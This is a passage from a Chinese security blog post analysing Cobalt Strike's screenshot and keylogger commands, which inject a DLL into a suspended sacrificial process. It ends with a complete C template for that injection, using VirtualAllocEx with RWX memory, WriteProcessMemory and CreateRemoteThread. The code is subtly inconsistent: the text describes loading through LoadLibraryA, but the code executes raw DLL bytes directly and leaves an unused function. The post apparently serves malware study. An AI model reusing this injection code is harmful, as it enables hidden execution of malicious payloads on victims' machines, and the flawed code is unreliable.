<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240907214931-mgre23h.png" alt="image" loading="lazy">​</p>
<p>创建了一个size&#x3D;30C00h的内存空间，在内存里面找到这个dll，dump出来后面分析；<code>WriteProcessMemory</code>​函数将代码注入到指定内存中</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240907153357-pmx5jf1.png" alt="image" loading="lazy">​</p>
<p>这里恢复挂起之后就，相当于将前面创建，并注入的线程进行运行，启动了傀儡线程？</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240907223853-zjr1vaq.png" alt="image" loading="lazy">​</p>
<p>这里是创建了一个file，将截屏保存，后面转换为网络数据，发送回到客户端</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240905214612-4hewr4y.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>​<code>keylogger</code>​命令与screenshot类似，差距在进程注入那里的dll</p>
<p>‍</p>
<p>‍</p>
<h1 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h1><p>实现一个傀儡进程并将 DLL 加载到内存中</p>
<h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><ol>
<li><strong>创建傀儡进程</strong>:<br> 使用 <code>CreateProcess</code>​ 创建一个新的进程，该进程将作为傀儡进程。</li>
<li><strong>获取 DLL 的内存</strong>:<br> 将 DLL 的字节流保存在内存中，而不是从磁盘加载。</li>
<li><strong>注入 DLL</strong>:<br> 使用 <code>VirtualAllocEx</code>​ 在目标进程的内存中分配空间，并使用 <code>WriteProcessMemory</code>​ 将 DLL 的字节流写入目标进程的内存。然后，通过 <code>CreateRemoteThread</code>​ 或 <code>NtCreateThreadEx</code>​ 在目标进程中执行 <code>LoadLibraryA</code>​，加载该 DLL。</li>
</ol>
<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例 DLL 的字节流（此处应替换为实际的 DLL 字节流）</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dllBytes[] = &#123;</span><br><span class="line">    <span class="comment">// 将您的 DLL 的字节流放在这里</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> dllSize = <span class="keyword">sizeof</span>(dllBytes);</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadFunction</span><span class="params">(LPVOID lpParam)</span> &#123;</span><br><span class="line">    <span class="comment">// 这里是傀儡进程的主线程逻辑</span></span><br><span class="line">    Sleep(<span class="number">10000</span>); <span class="comment">// 模拟操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建傀儡进程</span></span><br><span class="line">    STARTUPINFOA si = &#123; <span class="keyword">sizeof</span>(si) &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!CreateProcessA(</span><br><span class="line">            <span class="literal">NULL</span>, </span><br><span class="line">            <span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, <span class="comment">// 傀儡进程</span></span><br><span class="line">            <span class="literal">NULL</span>, </span><br><span class="line">            <span class="literal">NULL</span>, </span><br><span class="line">            FALSE, </span><br><span class="line">            CREATE_SUSPENDED, <span class="comment">// 创建为挂起状态</span></span><br><span class="line">            <span class="literal">NULL</span>, </span><br><span class="line">            <span class="literal">NULL</span>, </span><br><span class="line">            &amp;si, </span><br><span class="line">            &amp;pi)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateProcessA failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在目标进程中分配内存</span></span><br><span class="line">    LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, <span class="literal">NULL</span>, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!remoteMemory) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        TerminateProcess(pi.hProcess, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 DLL 字节流写入目标进程</span></span><br><span class="line">    SIZE_T bytesWritten;</span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(pi.hProcess, remoteMemory, dllBytes, dllSize, &amp;bytesWritten)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        VirtualFreeEx(pi.hProcess, remoteMemory, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        TerminateProcess(pi.hProcess, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建远程线程以加载 DLL</span></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteMemory, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        VirtualFreeEx(pi.hProcess, remoteMemory, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        TerminateProcess(pi.hProcess, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复傀儡进程</span></span><br><span class="line">    ResumeThread(pi.hThread);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待傀儡进程结束</span></span><br><span class="line">    WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>YCr0w</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://example.com/2024/08/07/CobaltStrike%E5%8A%A8%E8%B0%83/" title="CobaltStrike动调">http://example.com/2024/08/07/CobaltStrike%E5%8A%A8%E8%B0%83/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/08/07/%E5%8A%A0%E8%BD%BD%E7%89%B9%E5%AE%9A%E6%A8%A1%E5%9D%97%E7%9A%84%E6%96%B9%E6%B3%95/" rel="prev" title="加载特定模块的方法"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">加载特定模块的方法</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/08/07/dll%E5%8A%AB%E6%8C%81/" rel="next" title="dll劫持"><span class="post-nav-text">dll劫持</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> YCr0w</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>